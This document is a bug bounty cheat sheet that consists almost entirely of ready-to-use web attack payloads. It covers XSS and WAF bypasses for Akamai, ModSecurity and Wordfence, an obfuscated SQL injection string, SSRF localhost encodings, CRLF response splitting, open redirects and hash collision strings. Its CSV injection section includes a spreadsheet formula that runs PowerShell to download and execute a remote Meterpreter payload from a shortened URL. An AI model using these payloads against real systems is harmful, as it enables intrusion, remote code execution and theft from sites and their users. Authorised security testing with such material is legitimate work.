# Bug Bounty Cheat Sheet

## XSS

**Chrome XSS-Auditor Bypass** by [Masato Kinugawa](https://github.com/masatokinugawa)

```html
<svg><animate xlink:href=#x attributeName=href values=&#106;avascript:alert(1) /><a id=x><rect width=100 height=100 /></a>
```
**Kona WAF (Akamai) Bypass**

```html
\');confirm(1);//
```

**ModSecurity WAF Bypass**
Note: This kind of depends on what security level the application is set to. See: https://modsecurity.org/rules.html
```html
<img src=x onerror=prompt(document.domain) onerror=prompt(document.domain) onerror=prompt(document.domain)>
```

**Wordfence XSS Bypasses**

```html
<meter onmouseover="alert(1)"
```

```html
'">><div><meter onmouseover="alert(1)"</div>"
```

```html
>><marquee loop=1 width=0 onfinish=alert(1)>
```

**jQuery < 3.0.0 XSS**
 by [Egor Homakov](https://github.com/jquery/jquery/issues/2432)

```js
$.get('http://sakurity.com/jqueryxss')
```

In order to really exploit this jQuery XSS you will need to fulfil one of the following requirements:

1) Find any cross domain requests to untrusted domains which may inadvertently execute script.
2) Find any requests to trusted API endpoints where script can be injected into data sources.

**URL verification bypasses (works without `&#x09;` too)**

```
javas&#x09;cript://www.google.com/%0Aalert(1)
```

**Markdown XSS**

```md
[a](javascript://www.google.com%0Aprompt(1))
```

## SQLI

**Akamai Kona Bypass**

* `MID` instead of `SUBSTRING`
* `LIKE` instead of `=`
* `/**/` instead of a `space`
* `CURRENT_USER` instead of `CURRENT_USER()`
* ` "` instead of `'`

Final example: 

```sql
444/**/OR/**/MID(CURRENT_USER,1,1)/**/LIKE/**/"p"/**/#
```

## SSRF

```
http://0177.1/
```

```
http://0x7f.1/
```

```
https://520968996
```

_Note:_ The latter can be calculated using http://www.subnetmask.info/

**Exotic Handlers**

```
gopher://, dict://, php://, jar://, tftp://
```

**IPv6**

```
http://[::1]
```

```
http://[::]
```

## CRLF Injection || HTTP Response Splitting

```
%0dSet-Cookie:csrf_token=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
```

**CRLF Injection to XSS**

```
%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2e%2e
```

## CSV Injection

**Newline character**

```
%0A-3+3+cmd|' /C calc'!D2
```

**Meterpreter Shell**

```
=cmd|'/C powershell IEX(wget bit.ly/1X146m3)'!A0
```

## LFI

**Filter Bypass**

```
"../\", " ..\/", "/.." & "\/.."
```

## RCE

**Werkzeug Debugger**

Find somewhere where user input can be supplied and submit the following string to cause an error:

```
strіng
```

If the target is running their application in debug mode you might be able to run commands. If you are running the target locally, you can probably brute-force the debugger PIN. The debugger PIN is always in the following format: `***-***-***`.

## Open Redirect

```
/%09/google.com
```

```
/%5cgoogle.com
```

```
//www.google.com/%2f%2e%2e
```

```
//www.google.com/%2e%2e
```

## Crypto

**MD5 Collision Strings**

```
%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
```

```
%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
```

<details>
	<summary>URL decode strings.</summary>
	<pre><code>4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2</code></pre>
	<pre><code>4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2</code></pre>
</details><br>

**SHA-1 Collision Strings**

```
%25%50%44%46%2D%31%2E%33%0A%25%E2%E3%CF%D3%0A%0A%0A%31%20%30%20%6F%62%6A%0A%3C%3C%2F%57%69%64%74%68%20%32%20%30%20%52%2F%48%65%69%67%68%74%20%33%20%30%20%52%2F%54%79%70%65%20%34%20%30%20%52%2F%53%75%62%74%79%70%65%20%35%20%30%20%52%2F%46%69%6C%74%65%72%20%36%20%30%20%52%2F%43%6F%6C%6F%72%53%70%61%63%65%20%37%20%30%20%52%2F%4C%65%6E%67%74%68%20%38%20%30%20%52%2F%42%69%74%73%50%65%72%43%6F%6D%70%6F%6E%65%6E%74%20%38%3E%3E%0A%73%74%72%65%61%6D%0A%FF%D8%FF%FE%00%24%53%48%41%2D%31%20%69%73%20%64%65%61%64%21%21%21%21%21%85%2F%EC%09%23%39%75%9C%39%B1%A1%C6%3C%4C%97%E1%FF%FE%01%73%46%DC%91%66%B6%7E%11%8F%02%9A%B6%21%B2%56%0F%F9%CA%67%CC%A8%C7%F8%5B%A8%4C%79%03%0C%2B%3D%E2%18%F8%6D%B3%A9%09%01%D5%DF%45%C1%4F%26%FE%DF%B3%DC%38%E9%6A%C2%2F%E7%BD%72%8F%0E%45%BC%E0%46%D2%3C%57%0F%EB%14%13%98%BB%55%2E%F5%A0%A8%2B%E3%31%FE%A4%80%37%B8%B5%D7%1F%0E%33%2E%DF%93%AC%35%00%EB%4D%DC%0D%EC%C1%A8%64%79%0C%78%2C%76%21%56%60%DD%30%97%91%D0%6B%D0%AF%3F%98%CD%A4%BC%46%29%B1
```

```
%25%50%44%46%2D%31%2E%33%0A%25%E2%E3%CF%D3%0A%0A%0A%31%20%30%20%6F%62%6A%0A%3C%3C%2F%57%69%64%74%68%20%32%20%30%20%52%2F%48%65%69%67%68%74%20%33%20%30%20%52%2F%54%79%70%65%20%34%20%30%20%52%2F%53%75%62%74%79%70%65%20%35%20%30%20%52%2F%46%69%6C%74%65%72%20%36%20%30%20%52%2F%43%6F%6C%6F%72%53%70%61%63%65%20%37%20%30%20%52%2F%4C%65%6E%67%74%68%20%38%20%30%20%52%2F%42%69%74%73%50%65%72%43%6F%6D%70%6F%6E%65%6E%74%20%38%3E%3E%0A%73%74%72%65%61%6D%0A%FF%D8%FF%FE%00%24%53%48%41%2D%31%20%69%73%20%64%65%61%64%21%21%21%21%21%85%2F%EC%09%23%39%75%9C%39%B1%A1%C6%3C%4C%97%E1%FF%FE%01%7F%46%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2%56%0B%45%CA%67%D6%88%C7%F8%4B%8C%4C%79%1F%E0%2B%3D%F6%14%F8%6D%B1%69%09%01%C5%6B%45%C1%53%0A%FE%DF%B7%60%38%E9%72%72%2F%E7%AD%72%8F%0E%49%04%E0%46%C2%30%57%0F%E9%D4%13%98%AB%E1%2E%F5%BC%94%2B%E3%35%42%A4%80%2D%98%B5%D7%0F%2A%33%2E%C3%7F%AC%35%14%E7%4D%DC%0F%2C%C1%A8%74%CD%0C%78%30%5A%21%56%64%61%30%97%89%60%6B%D0%BF%3F%98%CD%A8%04%46%29%A1
```

<details>
	<summary>URL decode strings.</summary>
	<pre><code>255044462D312E330A25E2E3CFD30A0A0A312030206F626A0A3C3C2F57696474682032203020522F4865696768742033203020522F547970652034203020522F537562747970652035203020522F46696C7465722036203020522F436F6C6F7253706163652037203020522F4C656E6774682038203020522F42697473506572436F6D706F6E656E7420383E3E0A73747265616D0AFFD8FFFE00245348412D3120697320646561642121212121852FEC092339759C39B1A1C63C4C97E1FFFE017F46DC93A6B67E013B029AAA1DB2560B45CA67D688C7F84B8C4C791FE02B3DF614F86DB1690901C56B45C1530AFEDFB76038E972722FE7AD728F0E4904E046C230570FE9D41398ABE12EF5BC942BE33542A4802D98B5D70F2A332EC37FAC3514E74DDC0F2CC1A874CD0C78305A21566461309789606BD0BF3F98CDA8044629A1</code></pre>
	<pre><code>255044462D312E330A25E2E3CFD30A0A0A312030206F626A0A3C3C2F57696474682032203020522F4865696768742033203020522F547970652034203020522F537562747970652035203020522F46696C7465722036203020522F436F6C6F7253706163652037203020522F4C656E6774682038203020522F42697473506572436F6D706F6E656E7420383E3E0A73747265616D0AFFD8FFFE00245348412D3120697320646561642121212121852FEC092339759C39B1A1C63C4C97E1FFFE017346DC9166B67E118F029AB621B2560FF9CA67CCA8C7F85BA84C79030C2B3DE218F86DB3A90901D5DF45C14F26FEDFB3DC38E96AC22FE7BD728F0E45BCE046D23C570FEB141398BB552EF5A0A82BE331FEA48037B8B5D71F0E332EDF93AC3500EB4DDC0DECC1A864790C782C76215660DD309791D06BD0AF3F98CDA4BC4629B1</code></pre>
</details><br>

**Bcrypt Wraparoud Bug**

```
000000000000000000000000000000000000000000000000000000000000000000000000
```

```
012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234
```

```
0123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345
```

## Content Injection

```
❤ bounty pls
```
